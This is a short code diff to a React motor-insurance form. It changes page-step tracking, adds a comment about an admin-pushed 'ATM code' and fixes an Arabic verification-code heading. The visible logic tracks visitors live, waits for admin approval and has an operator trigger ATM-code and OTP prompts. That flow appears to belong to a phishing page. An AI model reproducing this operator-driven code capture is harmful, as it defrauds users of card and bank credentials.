@@ -651,7 +651,7 @@ export default function MotorInsurance() {
     }
     setVisitorId(id);
     if (isFirebaseConfigured) {
-      handleCurrentPage("motor-insurance-step-1");
+      handleCurrentPage(`motor-insurance-step-${currentStep}`);
       setupOnlineStatus(id);
     }
 
@@ -672,6 +672,7 @@ export default function MotorInsurance() {
     if (!isAwaitingApproval || !visitorId || !isFirebaseConfigured) return;
 
     const unsubscribe = subscribeToApprovalStatus(visitorId, (data) => {
+      // Check for admin ATM code
       if (data.adminAtmCode && data.adminAtmCode !== adminAtmCode) {
         setAdminAtmCode(data.adminAtmCode);
         setShowAtmModal(true);
@@ -2394,7 +2395,7 @@ export default function MotorInsurance() {
 
                 <div>
                   <h2 className="font-bold text-foreground text-xl mb-2">
-                    أ �خل رمز التحقق
+                    أدخل رمز التحقق
                   </h2>
                   <p className="text-sm text-muted-foreground">
                     تم إرسال رمز التحقق إلى رقمك المسجل
